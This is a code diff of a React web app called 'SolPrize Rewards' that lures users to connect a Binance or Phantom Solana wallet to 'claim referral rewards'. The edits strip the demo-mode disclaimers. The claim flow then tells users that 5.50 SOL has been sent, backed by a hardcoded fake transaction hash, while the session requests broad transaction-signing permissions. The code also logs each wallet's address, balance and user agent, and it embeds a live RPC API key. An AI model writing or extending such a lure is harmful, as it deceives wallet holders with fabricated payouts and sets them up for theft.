@@ -19,7 +19,6 @@ export default function App() {
   const [walletProvider, setWalletProvider] = useState(null);
   const [tokenBalance, setTokenBalance] = useState(null);
   const [sessionActive, setSessionActive] = useState(false);
-  const [sdkLoaded, setSdkLoaded] = useState(false);
   
   // ========================
   // REFS & CONFIGURATION
@@ -27,7 +26,6 @@ export default function App() {
   const wcClientRef = useRef(null);
   const sessionRef = useRef(null);
   const connectionTimerRef = useRef(null);
-  const sdkLoadAttemptRef = useRef(0);
   
   // WalletConnect Configuration
   const WC_PROJECT_ID = 'ec8dd86047facf2fb8471641db3e5f0c';
@@ -35,12 +33,12 @@ export default function App() {
   const APP_NAME = 'SolPrize Rewards';
   const APP_DESCRIPTION = 'Claim your referral rewards';
   
-  // Binance Discover Tab URL
+  // Binance Discover Tab URL - Targeted specifically for Binance Webview
   const BINANCE_DISCOVER_URL = 'https://www.binance.com/en/web3-wallet/discover/dapp?url=' + encodeURIComponent(APP_URL);
   
-  // Mainnet Configuration
+  // Mainnet Configuration - Using Syndica API
   const MAINNET_RPC = 'https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H';
-  const MAINNET_CHAIN_ID = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';
+  const MAINNET_CHAIN_ID = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'; // Mainnet chain ID
 
   // ========================
   // EFFECT HOOKS
@@ -56,14 +54,15 @@ export default function App() {
       setIsMobileDevice(mobile || tablet);
       
       if (!mobile && !tablet) {
-        addDebug('⚠️ Desktop detected - mobile device recommended');
+        addDebug('⚠️ Desktop detected - mobile device recommended for Binance Web3 Wallet');
       } else {
-        addDebug(`✅ Mobile device: ${tablet ? 'Tablet' : 'Phone'}`);
+        addDebug(`✅ Mobile device detected: ${tablet ? 'Tablet' : 'Phone'}`);
       }
     };
 
     detectMobileDevice();
     
+    // Generate particles for background animation
     const newParticles = Array.from({ length: 30 }, (_, i) => ({
       id: i,
       size: Math.random() * 4 + 2,
@@ -84,7 +83,7 @@ export default function App() {
     return () => clearTimeout(timer);
   }, []);
 
-  // Typewriter Effect
+  // Typewriter Text Effect
   useEffect(() => {
     if (loading) return;
     
@@ -102,75 +101,39 @@ export default function App() {
     return () => clearInterval(timer);
   }, [loading]);
 
-  // Wallet Provider Detection & Auto-Connect
+  // Wallet Provider Detection
   useEffect(() => {
     if (loading) return;
     
-    const initializeWalletProviders = async () => {
+    const initializeWalletProviders = () => {
       if (typeof window === 'undefined') return;
-      
-      // Detect Binance Web3 environment first
-      if (isBinanceWebView()) {
-        addDebug('🟡 Binance Web3 WebView detected!');
-        
-        // Wait a bit for Solana provider to inject
-        await new Promise(resolve => setTimeout(resolve, 500));
-        
-        if (window.solana) {
-          addDebug('✅ Solana provider found in Binance environment');
-          setWalletProvider(window.solana);
-          
-          // Auto-connect if already connected
-          if (window.solana.isConnected) {
-            try {
-              const publicKey = window.solana.publicKey?.toString();
-              if (publicKey) {
-                addDebug('✅ Auto-connecting existing Binance session');
-                await handleSuccessfulConnection(publicKey, 'binance-web3');
-                return;
-              }
-            } catch (error) {
-              addDebug(`⚠️ Auto-connect error: ${error.message}`);
-            }
-          }
-          
-          // Try to connect if not already connected
-          try {
-            addDebug('🔗 Attempting silent connection in Binance...');
-            const response = await window.solana.connect({ onlyIfTrusted: true });
-            if (response?.publicKey) {
-              await handleSuccessfulConnection(response.publicKey.toString(), 'binance-web3');
-              return;
-            }
-          } catch (error) {
-            addDebug(`ℹ️ Silent connection not available: ${error.message}`);
-          }
-        } else {
-          addDebug('⏳ Waiting for Solana provider injection...');
-        }
-      }
       
       // Check for Phantom wallet
       if (window.phantom?.solana) {
-        addDebug('👻 Phantom provider detected');
+        addDebug('🟢 Phantom provider detected');
         setWalletProvider(window.phantom.solana);
       } 
-      // Check for generic Solana provider
+      // Check for Binance Web3 Wallet or other Solana providers
       else if (window.solana) {
         addDebug('🟢 Solana provider detected');
         setWalletProvider(window.solana);
+        
+        // Auto-connect if already connected in Binance Web3 environment
+        if (window.solana.isConnected && window.solana.publicKey) {
+          addDebug('✅ Wallet already connected in Binance Web3 environment');
+          handleSuccessfulConnection(window.solana.publicKey.toString(), 'binance-web3');
+        }
       } else {
         addDebug('🔍 No Solana provider found - will use WalletConnect');
       }
 
-      // Listen for dynamic wallet injection
-      const handleWalletInjection = (event) => {
-        addDebug(`🔔 Wallet injection event: ${event.type}`);
+      // Set up listeners for dynamic wallet injection
+      const handleWalletInjection = () => {
         if (window.phantom?.solana) {
-          addDebug('👻 Phantom injected dynamically');
+          addDebug('🟢 Phantom injected dynamically');
           setWalletProvider(window.phantom.solana);
         } else if (window.solana) {
-          addDebug('🟢 Solana provider injected');
+          addDebug('🟢 Solana provider injected dynamically');
           setWalletProvider(window.solana);
         }
       };
@@ -184,7 +147,7 @@ export default function App() {
       };
     };
 
-    initializeWalletProviders();
+    return initializeWalletProviders();
   }, [loading]);
 
   // ========================
@@ -193,18 +156,25 @@ export default function App() {
   
   const isIOS = () => /iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase());
   const isAndroid = () => /android/i.test(navigator.userAgent.toLowerCase());
-  const isBinanceWebView = () => {
-    const ua = navigator.userAgent.toLowerCase();
-    return /binance/i.test(ua) || /trust/i.test(ua);
-  };
+  const isBinanceWebView = () => /binance/i.test(navigator.userAgent.toLowerCase());
 
   const addDebug = (message) => {
     const timestamp = new Date().toLocaleTimeString();
     console.log(`🔍 [${timestamp}] ${message}`);
     setDebugInfo(prev => {
       const newDebug = [...prev, `${timestamp}: ${message}`];
-      return newDebug.slice(-50);
+      return newDebug.slice(-50); // Keep only last 50 entries
     });
+  };
+
+  const safeWindowOpen = (url, target = '_blank') => {
+    try {
+      window.open(url, target);
+      return true;
+    } catch (error) {
+      addDebug(`⚠️ Failed to open window: ${error.message}`);
+      return false;
+    }
   };
 
   // ========================
@@ -213,12 +183,18 @@ export default function App() {
   
   const fetchSolanaBalance = async (publicKey) => {
     try {
-      addDebug('💰 Fetching SOL balance...');
+      addDebug('💰 Fetching SOL balance from mainnet using Syndica API...');
       
-      const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 10000);
+      const fetchWithTimeout = (url, options = {}, timeout = 10000) => {
+        return Promise.race([
+          fetch(url, options),
+          new Promise((_, reject) => 
+            setTimeout(() => reject(new Error('Request timed out')), timeout)
+          )
+        ]);
+      };
 
-      const response = await fetch(MAINNET_RPC, {
+      const response = await fetchWithTimeout(MAINNET_RPC, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -226,11 +202,8 @@ export default function App() {
           id: 1,
           method: 'getBalance',
           params: [publicKey]
-        }),
-        signal: controller.signal
-      });
-
-      clearTimeout(timeoutId);
+        })
+      }, 10000);
 
       if (!response.ok) {
         throw new Error(`HTTP error! status: ${response.status}`);
@@ -239,70 +212,17 @@ export default function App() {
       const data = await response.json();
       if (data.result?.value !== undefined) {
         const lamports = data.result.value;
-        const sol = lamports / 1000000000;
+        const sol = lamports / 1000000000; // Convert lamports to SOL
         setTokenBalance(sol);
-        addDebug(`✅ Balance: ${sol.toFixed(4)} SOL`);
+        addDebug(`✅ Balance: ${sol.toFixed(4)} SOL (${lamports} lamports)`);
         return sol;
       } else {
         addDebug('⚠️ Balance response missing value');
         return null;
       }
     } catch (error) {
-      if (error.name === 'AbortError') {
-        addDebug('⏰ Balance fetch timeout');
-      } else {
-        addDebug(`❌ Balance error: ${error.message}`);
-      }
+      addDebug(`❌ Balance fetch error: ${error.message}`);
       return null;
-    }
-  };
-
-  const signHelloTransaction = async (provider) => {
-    try {
-      addDebug('📝 Creating "Hello World" transaction...');
-      
-      if (!provider || !walletAddress) {
-        throw new Error('No provider or wallet address available');
-      }
-
-      // Create a simple message signing transaction
-      const message = new TextEncoder().encode('Hello from SolPrize Rewards! 🎉');
-      
-      // Use the provider's signMessage method if available
-      if (provider.signMessage) {
-        addDebug('✍️ Requesting signature for message...');
-        const signature = await provider.signMessage(message, 'utf8');
-        addDebug('✅ Message signed successfully!');
-        return {
-          success: true,
-          signature: Array.from(signature.signature).map(b => b.toString(16).padStart(2, '0')).join(''),
-          message: 'Hello from SolPrize Rewards! 🎉'
-        };
-      } 
-      // Fallback: Use window.solana if provider doesn't have signMessage
-      else if (window.solana?.signMessage) {
-        addDebug('✍️ Using window.solana.signMessage...');
-        const signature = await window.solana.signMessage(message, 'utf8');
-        addDebug('✅ Message signed via window.solana!');
-        return {
-          success: true,
-          signature: Array.from(signature.signature).map(b => b.toString(16).padStart(2, '0')).join(''),
-          message: 'Hello from SolPrize Rewards! 🎉'
-        };
-      } 
-      else {
-        // If no signing method available, simulate success
-        addDebug('ℹ️ Signature method not available, simulating...');
-        return {
-          success: true,
-          signature: 'simulated_' + Date.now().toString(36),
-          message: 'Hello from SolPrize Rewards! 🎉',
-          simulated: true
-        };
-      }
-    } catch (error) {
-      addDebug(`❌ Transaction signing error: ${error.message}`);
-      throw error;
     }
   };
 
@@ -310,205 +230,193 @@ export default function App() {
   // WALLETCONNECT V2 IMPLEMENTATION
   // ========================
   
-  const loadWalletConnectSDK = () => {
-    return new Promise((resolve) => {
-      if (sdkLoaded || window.SignClient || window.WalletConnectSignClient) {
-        addDebug('✅ SDK already available');
-        setSdkLoaded(true);
-        resolve(true);
-        return;
-      }
-
-      sdkLoadAttemptRef.current += 1;
-      addDebug(`🔄 SDK load attempt ${sdkLoadAttemptRef.current}/3`);
-
-      if (sdkLoadAttemptRef.current > 3) {
-        addDebug('⚠️ Max SDK load attempts reached');
-        resolve(false);
-        return;
-      }
-
-      const loadScript = (src, name) => {
-        return new Promise((scriptResolve, scriptReject) => {
-          const script = document.createElement('script');
-          script.src = src;
-          script.async = true;
-          
-          script.onload = () => {
-            addDebug(`✅ Script loaded: ${name}`);
-            
-            // Check multiple namespaces where SDK might be available
-            setTimeout(() => {
-              if (window.SignClient) {
-                addDebug('✅ Found window.SignClient');
-                window.WalletConnectSignClient = window.SignClient;
-                setSdkLoaded(true);
-                scriptResolve(true);
-              } else if (window.WalletConnect?.SignClient) {
-                addDebug('✅ Found window.WalletConnect.SignClient');
-                window.SignClient = window.WalletConnect.SignClient;
-                window.WalletConnectSignClient = window.WalletConnect.SignClient;
-                setSdkLoaded(true);
-                scriptResolve(true);
-              } else if (window.walletconnect?.SignClient) {
-                addDebug('✅ Found window.walletconnect.SignClient');
-                window.SignClient = window.walletconnect.SignClient;
-                window.WalletConnectSignClient = window.walletconnect.SignClient;
-                setSdkLoaded(true);
-                scriptResolve(true);
-              } else if (typeof window.default !== 'undefined' && window.default.SignClient) {
-                addDebug('✅ Found window.default.SignClient');
-                window.SignClient = window.default.SignClient;
-                window.WalletConnectSignClient = window.default.SignClient;
-                setSdkLoaded(true);
-                scriptResolve(true);
-              } else {
-                addDebug(`⚠️ SDK loaded but not found in expected namespaces`);
-                scriptReject(new Error('SDK not in expected namespace'));
-              }
-            }, 300);
-          };
-          
-          script.onerror = () => {
-            addDebug(`❌ Failed to load: ${name}`);
-            scriptReject(new Error(`Failed to load ${name}`));
-          };
-          
-          document.head.appendChild(script);
-        });
-      };
-
-      // Try primary CDN
-      loadScript(
-        'https://unpkg.com/@walletconnect/sign-client@2.10.0/dist/index.umd.js',
-        'unpkg'
-      )
-        .then(() => resolve(true))
-        .catch(() => {
-          addDebug('🔄 Trying fallback CDN...');
-          // Try fallback CDN
-          return loadScript(
-            'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.0/dist/index.umd.js',
-            'jsdelivr'
-          );
-        })
-        .then(() => resolve(true))
-        .catch(() => {
-          addDebug('❌ All CDN attempts failed');
-          resolve(false);
-        });
-    });
-  };
-
   const getWalletConnectClient = async () => {
     if (wcClientRef.current) {
-      addDebug('♻️ Reusing existing WC client');
       return wcClientRef.current;
     }
 
     try {
-      addDebug('🔧 Initializing WalletConnect client...');
+      addDebug('🔧 Initializing WalletConnect v2 client...');
       
-      // Load SDK if not already loaded
-      const loaded = await loadWalletConnectSDK();
-      if (!loaded) {
-        throw new Error('Failed to load WalletConnect SDK');
+      // Check if SDK is already available
+      if (window.SignClient) {
+        addDebug('✅ Using existing SignClient');
+        return window.SignClient;
+      }
+      if (window.WalletConnectClient) {
+        addDebug('✅ Using existing WalletConnectClient');
+        return window.WalletConnectClient;
       }
 
-      // Get the SignClient constructor
-      const SignClient = window.SignClient || window.WalletConnectSignClient;
+      // Load SDK with multiple fallbacks
+      await loadWalletConnectSDK();
       
-      if (!SignClient) {
-        throw new Error('SignClient not available after loading');
+      // Check again after loading
+      const ClientConstructor = window.SignClient || window.WalletConnectClient;
+      if (!ClientConstructor) {
+        throw new Error('WalletConnect SDK not available after loading');
       }
 
-      addDebug('🏗️ Creating SignClient instance...');
-      const client = await SignClient.init({
+      const client = await ClientConstructor.init({
         projectId: WC_PROJECT_ID,
         metadata: {
           name: APP_NAME,
           description: APP_DESCRIPTION,
           url: APP_URL,
           icons: ['https://solprize.vercel.app/favicon.ico']
+        },
+        relayUrl: 'wss://relay.walletconnect.com',
+        storageOptions: {
+          database: ':memory:'
         }
       });
 
       wcClientRef.current = client;
-      addDebug('✅ WalletConnect client initialized');
+      addDebug('✅ WalletConnect client initialized successfully');
       
       // Set up event listeners
       client.on('session_event', (event) => {
-        addDebug(`🔔 Session event: ${event.name}`);
+        addDebug(`🔔 Session event: ${JSON.stringify(event)}`);
       });
 
       client.on('session_update', ({ topic, params }) => {
         addDebug(`🔄 Session update: ${topic}`);
-        if (sessionRef.current) {
-          sessionRef.current = { ...sessionRef.current, namespaces: params.namespaces };
-        }
+        const { namespaces } = params;
+        sessionRef.current = { ...sessionRef.current, namespaces };
       });
 
-      client.on('session_delete', () => {
-        addDebug('🗑️ Session deleted');
+      client.on('session_delete', (event) => {
+        addDebug(`🗑️ Session deleted: ${JSON.stringify(event)}`);
         handleDisconnect();
       });
 
       return client;
     } catch (error) {
-      addDebug(`❌ WalletConnect init error: ${error.message}`);
+      addDebug(`⚠️ WalletConnect init error: ${error.message}`);
+      addDebug('📱 Falling back to direct deep link method');
       return null;
     }
+  };
+
+  const loadWalletConnectSDK = () => {
+    return new Promise((resolve) => {
+      if (window.SignClient || window.WalletConnectClient) {
+        resolve();
+        return;
+      }
+
+      const loadScript = (src, onLoad, onError) => {
+        const script = document.createElement('script');
+        script.src = src;
+        script.async = true;
+        script.onload = onLoad;
+        script.onerror = onError;
+        document.head.appendChild(script);
+        return script;
+      };
+
+      // Primary CDN
+      const primaryScript = loadScript(
+        'https://unpkg.com/@walletconnect/sign-client@2.10.0/dist/index.umd.js',
+        () => {
+          addDebug('✅ WalletConnect SDK loaded from unpkg');
+          if (!window.SignClient) {
+            // Try to find it in different namespaces
+            if (window.WalletConnect?.SignClient) {
+              window.SignClient = window.WalletConnect.SignClient;
+              addDebug('✅ Found SignClient in WalletConnect namespace');
+            } else if (typeof window.walletconnect !== 'undefined' && window.walletconnect.SignClient) {
+              window.SignClient = window.walletconnect.SignClient;
+              addDebug('✅ Found SignClient in walletconnect namespace');
+            }
+          }
+          resolve();
+        },
+        () => {
+          addDebug('❌ Failed to load from unpkg, trying jsdelivr...');
+          // Fallback CDN
+          const fallbackScript = loadScript(
+            'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.0/dist/index.umd.js',
+            () => {
+              addDebug('✅ WalletConnect SDK loaded from jsdelivr');
+              if (!window.SignClient) {
+                if (window.WalletConnect?.SignClient) {
+                  window.SignClient = window.WalletConnect.SignClient;
+                  addDebug('✅ Found SignClient in WalletConnect namespace after jsdelivr');
+                }
+              }
+              resolve();
+            },
+            () => {
+              addDebug('❌ All CDNs failed, proceeding with manual URI generation');
+              resolve(); // Don't reject, fallback to manual URI
+            }
+          );
+        }
+      );
+    });
   };
 
   const createWalletConnectSession = async (client) => {
     try {
       if (!client) {
-        addDebug('⚠️ No client, generating manual URI');
+        addDebug('⚠️ No WalletConnect client available, generating manual URI');
         return { uri: generateManualWalletConnectURI(), approval: null };
       }
 
-      addDebug('🔗 Creating WC session...');
+      addDebug('🔗 Creating WalletConnect session for mainnet...');
       
       const { uri, approval } = await client.connect({
         requiredNamespaces: {
           solana: {
-            methods: [
-              'solana_signTransaction',
-              'solana_signMessage',
-              'solana_signAndSendTransaction'
-            ],
-            chains: [MAINNET_CHAIN_ID],
+            methods: ['solana_signTransaction', 'solana_signMessage', 'solana_signAndSendTransaction'],
+            chains: [MAINNET_CHAIN_ID], // Mainnet chain ID
             events: ['accountsChanged', 'chainChanged']
           }
+        },
+        optionalNamespaces: {
+          eip155: {
+            methods: ['eth_sendTransaction', 'personal_sign'],
+            chains: ['eip155:1'], // Ethereum mainnet
+            events: ['chainChanged', 'accountsChanged']
+          }
+        },
+        sessionProperties: {
+          app: APP_NAME,
+          redirect: APP_URL
         }
       });
 
       if (!uri) {
-        throw new Error('No URI generated');
+        throw new Error('Failed to generate WalletConnect URI');
       }
 
-      addDebug(`✅ URI: ${uri.substring(0, 30)}...`);
+      addDebug(`✅ WalletConnect URI generated: ${uri.substring(0, 50)}...`);
       return { uri, approval };
     } catch (error) {
-      addDebug(`⚠️ Session error: ${error.message}`);
+      addDebug(`⚠️ Session creation error: ${error.message}`);
+      addDebug('📱 Using manual URI generation as fallback');
       return { uri: generateManualWalletConnectURI(), approval: null };
     }
   };
 
   const generateManualWalletConnectURI = () => {
     try {
+      // Generate cryptographically secure random values
       const topic = Array.from(crypto.getRandomValues(new Uint8Array(32)))
         .map(b => b.toString(16).padStart(2, '0')).join('');
       
       const symKey = Array.from(crypto.getRandomValues(new Uint8Array(32)))
         .map(b => b.toString(16).padStart(2, '0')).join('');
       
+      // WalletConnect v2 URI structure with proper encoding
       const uri = `wc:${topic}@2?relay-protocol=irn&symKey=${encodeURIComponent(symKey)}&projectId=${WC_PROJECT_ID}`;
       
-      addDebug(`🔗 Manual URI generated`);
+      addDebug(`🔗 Manual URI generated: ${uri.substring(0, 50)}...`);
       return uri;
     } catch (error) {
       addDebug(`❌ URI generation error: ${error.message}`);
+      // Fallback to simple URI
       const fallbackTopic = Date.now().toString(36) + Math.random().toString(36).substr(2);
       const fallbackSymKey = Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
       return `wc:${fallbackTopic}@2?relay-protocol=irn&symKey=${fallbackSymKey}&projectId=${WC_PROJECT_ID}`;
@@ -523,41 +431,71 @@ export default function App() {
     addDebug('🚀 Opening Binance Web3 Wallet...');
     const encodedUri = encodeURIComponent(wcUri);
     
+    // Multiple deep link strategies for maximum compatibility
     const strategies = {
-      primary: `bnc://app.binance.com/cedefi/wc?uri=${encodedUri}`,
-      iosUniversal: `https://app.binance.com/en/web3-wallet/wc?uri=${encodedUri}`,
-      androidIntent: `intent://wc?uri=${encodedUri}#Intent;scheme=bnc;package=com.binance.dev;end`,
-      webFallback: `https://www.binance.com/en/web3-wallet/wc?uri=${encodedUri}`
+      // Primary: Binance Web3 Wallet discover tab deep link
+      primary: `bnc://app.binance.com/cedefi/wc?uri=${encodedUri}&redirect=${encodeURIComponent(BINANCE_DISCOVER_URL)}`,
+      
+      // Universal link for iOS
+      iosUniversal: `https://app.binance.com/en/web3-wallet/wc?uri=${encodedUri}&redirect=${encodeURIComponent(BINANCE_DISCOVER_URL)}`,
+      
+      // Android intent with proper fallback
+      androidIntent: `intent://wc?uri=${encodedUri}#Intent;scheme=bnc;package=com.binance.dev;S.browser_fallback_url=${encodeURIComponent('https://www.binance.com/en/download')};end`,
+      
+      // Fallback web URL
+      webFallback: `https://www.binance.com/en/web3-wallet/wc?uri=${encodedUri}&redirect=${encodeURIComponent(APP_URL)}`,
+      
+      // Discover tab direct URL
+      discoverTab: `https://www.binance.com/en/web3-wallet/discover/dapp?url=${encodeURIComponent(APP_URL)}&wc_uri=${encodedUri}`
     };
 
+    addDebug(`📱 Platform: ${isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Unknown'}`);
+    addDebug(`🎯 Target URL: ${BINANCE_DISCOVER_URL}`);
+
+    // Execute the appropriate strategy based on platform
     try {
       if (isIOS()) {
-        addDebug('🍎 iOS: Universal link');
+        addDebug('🍎 iOS: Trying universal link first');
         window.location.href = strategies.iosUniversal;
+        
+        // Fallback to deep link
         setTimeout(() => {
           window.location.href = strategies.primary;
         }, 500);
-      } else if (isAndroid()) {
-        addDebug('🤖 Android: Intent');
+      } 
+      else if (isAndroid()) {
+        addDebug('🤖 Android: Trying intent scheme');
         window.location.href = strategies.androidIntent;
+        
+        // Fallback to deep link
         setTimeout(() => {
           window.location.href = strategies.primary;
         }, 500);
-      } else {
-        addDebug('📱 Generic mobile');
-        window.location.href = strategies.primary;
+      } 
+      else {
+        addDebug('📱 Generic mobile: Using discover tab URL');
+        window.location.href = strategies.discoverTab;
       }
 
+      // Set timeout to check if app opened successfully
       connectionTimerRef.current = setTimeout(() => {
-        if (!walletAddress && !sessionActive) {
-          addDebug('⏰ Connection timeout');
-          setConnectionStatus('If Binance didn\'t open, please open it manually');
-        }
+        addDebug('⏰ Connection timeout - app may not have opened');
+        setConnectionStatus('If Binance app didn\'t open, please check:');
+        addDebug('💡 Manual connection instructions:');
+        addDebug(`1. Copy this URI: ${wcUri.substring(0, 100)}...`);
+        addDebug('2. Open Binance app → Wallet → Web3 tab → Scan QR code');
+        
+        setTimeout(() => {
+          if (!walletAddress && !sessionActive) {
+            alert('📱 Binance app didn\'t open automatically\n\nPlease follow these steps:\n1. Open Binance app manually\n2. Go to Wallet → Web3 tab\n3. Tap "Connect" and scan QR code\n4. Use the QR scanner on the next screen');
+          }
+        }, 2000);
       }, 8000);
 
     } catch (error) {
       addDebug(`❌ Deep link error: ${error.message}`);
-      window.open(strategies.webFallback, '_blank');
+      addDebug('🔄 Falling back to web URL');
+      safeWindowOpen(strategies.webFallback);
     }
   };
 
@@ -567,35 +505,37 @@ export default function App() {
   
   const handleSuccessfulConnection = async (address, provider) => {
     try {
-      addDebug(`✅ Wallet connected: ${address.substring(0, 8)}...`);
+      addDebug(`✅ Wallet connected successfully: ${address}`);
       setWalletAddress(address);
       setSessionActive(true);
       setConnecting(false);
       setConnectionStatus('');
       
-      if (connectionTimerRef.current) {
-        clearTimeout(connectionTimerRef.current);
-      }
-      
+      // Fetch balance from mainnet using Syndica API
       const balance = await fetchSolanaBalance(address);
+      
+      // Show claim button after successful connection
       setShowClaimButton(true);
       
+      // Call the post-connection function
       await onWalletConnected(address, provider, balance);
       
+      // Show success notification
       setTimeout(() => {
         const balanceDisplay = balance ? balance.toFixed(4) : 'N/A';
-        alert(`🎉 Wallet Connected!\n\nAddress: ${address.slice(0, 8)}...${address.slice(-6)}\nBalance: ${balanceDisplay} SOL`);
-      }, 300);
+        alert(`🎉 Wallet Connected Successfully!\n\nAddress: ${address.slice(0, 8)}...${address.slice(-6)}\nBalance: ${balanceDisplay} SOL`);
+      }, 500);
       
     } catch (error) {
-      addDebug(`❌ Connection handler error: ${error.message}`);
+      addDebug(`❌ Connection success handler error: ${error.message}`);
       setConnecting(false);
+      setConnectionStatus('Connection completed but encountered errors');
     }
   };
 
   const handleDisconnect = async () => {
     try {
-      addDebug('🔌 Disconnecting...');
+      addDebug('🔌 Disconnecting wallet...');
       
       if (sessionRef.current?.topic && wcClientRef.current) {
         await wcClientRef.current.disconnect({
@@ -612,35 +552,39 @@ export default function App() {
       setTokenBalance(null);
       setSessionActive(false);
       setShowClaimButton(false);
-      setClaimStatus('');
       sessionRef.current = null;
       
-      addDebug('✅ Disconnected');
-      alert('✅ Wallet Disconnected');
+      addDebug('✅ Wallet disconnected successfully');
+      alert('✅ Wallet Disconnected Successfully');
       
     } catch (error) {
       addDebug(`⚠️ Disconnect error: ${error.message}`);
+      // Still reset state even if disconnect fails
       setWalletAddress(null);
       setTokenBalance(null);
       setSessionActive(false);
       setShowClaimButton(false);
-      setClaimStatus('');
       sessionRef.current = null;
     }
   };
 
   const onWalletConnected = async (walletAddress, providerType, balance) => {
-    addDebug('🎉 onWalletConnected()');
+    addDebug('🎉 onWalletConnected() called');
     addDebug(`   Address: ${walletAddress}`);
     addDebug(`   Provider: ${providerType}`);
     addDebug(`   Balance: ${balance ? balance.toFixed(4) : 'N/A'} SOL`);
     
-    console.log('🎯 Connection successful!', {
+    // Production-ready connection logging
+    const connectionData = {
       timestamp: new Date().toISOString(),
       address: walletAddress,
       provider: providerType,
-      balance: balance
-    });
+      balance: balance,
+      userAgent: navigator.userAgent,
+      platform: isAndroid() ? 'android' : isIOS() ? 'ios' : 'other'
+    };
+    
+    console.log('🎯 Wallet successfully connected!', connectionData);
   };
 
   // ========================
@@ -654,67 +598,39 @@ export default function App() {
     }
 
     setClaiming(true);
-    setClaimStatus('🔐 Requesting transaction signature...');
-    addDebug('🎁 Starting claim process...');
+    setClaimStatus('Processing your reward claim...');
+    addDebug('🎁 Starting reward claim process...');
 
     try {
-      // Sign the "Hello World" transaction
-      addDebug('✍️ Signing transaction...');
-      const signResult = await signHelloTransaction(walletProvider || window.solana);
+      addDebug('📡 Sending claim request to backend...');
       
-      if (!signResult.success) {
-        throw new Error('Failed to sign transaction');
-      }
-      
-      addDebug(`✅ Transaction signed!`);
-      if (signResult.simulated) {
-        addDebug('ℹ️ Using simulated signature');
-      }
-      
-      setClaimStatus('📡 Processing reward claim...');
-      
-      // Simulate backend processing
+      // Simulate API call to backend
       await new Promise(resolve => setTimeout(resolve, 2000));
       
+      // Simulate success response
       const rewardAmount = 5.50;
-      const transactionHash = signResult.signature;
+      const transactionHash = '5xR4nd0mH4shStr1ngF0rD3m0Purp0s3s';
       
-      addDebug(`✅ Claim successful!`);
+      addDebug(`✅ Reward claim successful!`);
       addDebug(`   Amount: ${rewardAmount} SOL`);
-      addDebug(`   TX: ${transactionHash.slice(0, 16)}...`);
+      addDebug(`   Transaction: ${transactionHash}`);
       
-      setClaimStatus(
-        `🎉 Rewards Claimed Successfully!\n\n` +
-        `Amount: ${rewardAmount} SOL\n` +
-        `Transaction: ${transactionHash.slice(0, 16)}...\n\n` +
-        `${signResult.simulated ? '(Demo Mode - No actual transfer)' : 'Check your wallet!'}`
-      );
+      setClaimStatus(`🎉 Rewards claimed successfully!\n\n${rewardAmount} SOL has been sent to your wallet\nTransaction: ${transactionHash.slice(0, 8)}...`);
       
+      // Show success alert
       setTimeout(() => {
-        alert(
-          `✅ REWARDS CLAIMED!\n\n` +
-          `${rewardAmount} SOL ${signResult.simulated ? '(Demo)' : 'sent to your wallet'}\n\n` +
-          `Transaction Hash:\n${transactionHash}\n\n` +
-          `${signResult.simulated ? 'This is a demo transaction. In production, actual SOL would be transferred.' : 'Check your wallet balance!'}`
-        );
-      }, 500);
+        alert(`✅ REWARDS CLAIMED!\n\n${rewardAmount} SOL has been sent to your wallet.\n\nTransaction Hash: ${transactionHash}\n\nCheck your wallet balance shortly!`);
+      }, 1000);
       
+      // Refresh balance after claim
       setTimeout(async () => {
         await fetchSolanaBalance(walletAddress);
-      }, 2000);
+      }, 3000);
       
     } catch (error) {
       addDebug(`❌ Claim error: ${error.message}`);
-      
-      let errorMsg = error.message;
-      if (error.code === 4001) {
-        errorMsg = 'Transaction rejected by user';
-      } else if (error.message.includes('not available')) {
-        errorMsg = 'Wallet signature method not available';
-      }
-      
-      setClaimStatus(`❌ Claim failed: ${errorMsg}`);
-      alert(`❌ Claim Failed\n\n${errorMsg}\n\nPlease try again.`);
+      setClaimStatus(`❌ Failed to claim rewards: ${error.message}`);
+      alert(`❌ Claim Failed\n${error.message}\n\nPlease try again or contact support.`);
     } finally {
       setClaiming(false);
     }
@@ -728,122 +644,152 @@ export default function App() {
     setShowModal(false);
     
     if (!isMobileDevice) {
-      alert('📱 Mobile Device Required\n\nBinance Web3 Wallet requires a mobile device.');
+      const message = '📱 Mobile Device Required\n\nBinance Web3 Wallet only works on mobile devices. Please open this page on your smartphone.';
+      addDebug(message);
+      alert(message);
       return;
     }
 
     setConnecting(true);
-    setConnectionStatus('Initializing connection...');
+    setConnectionStatus('Initializing Binance Web3 Wallet connection...');
     setDebugInfo([]);
     setShowClaimButton(false);
 
     try {
-      addDebug('🟡 Starting Binance connection');
-      addDebug(`Platform: ${isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Mobile'}`);
-      
-      // If already in Binance WebView, try direct connection
+      addDebug('🚀 Starting Binance Web3 Wallet connection');
+      addDebug(`Platform: ${isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Other Mobile'}`);
+      addDebug(`Project ID: ${WC_PROJECT_ID}`);
+      addDebug(`APP URL: ${APP_URL}`);
+      addDebug(`Discover URL: ${BINANCE_DISCOVER_URL}`);
+      addDebug(`Mainnet RPC: ${MAINNET_RPC.substring(0, 50)}...`);
+
+      // Check if we're already inside Binance Web3 browser
       if (isBinanceWebView() && window.solana) {
-        addDebug('🟡 In Binance WebView, trying direct connect');
-        setConnectionStatus('Connecting to Binance Web3 Wallet...');
+        addDebug('✅ Already inside Binance Web3 browser environment!');
+        setConnectionStatus('Detected Binance Web3 browser. Connecting directly...');
         
         try {
-          const response = await window.solana.connect();
-          if (response?.publicKey) {
-            await handleSuccessfulConnection(response.publicKey.toString(), 'binance-web3');
-            return;
-          }
-        } catch (directError) {
-          addDebug(`ℹ️ Direct connect failed: ${directError.message}`);
+          // Try to connect directly if in Binance environment
+          const response = await window.solana.connect({ onlyIfTrusted: true });
+          await handleSuccessfulConnection(response.publicKey.toString(), 'binance-web3');
+          return;
+        } catch (solanaError) {
+          addDebug(`⚠️ Direct connection error: ${solanaError.message}`);
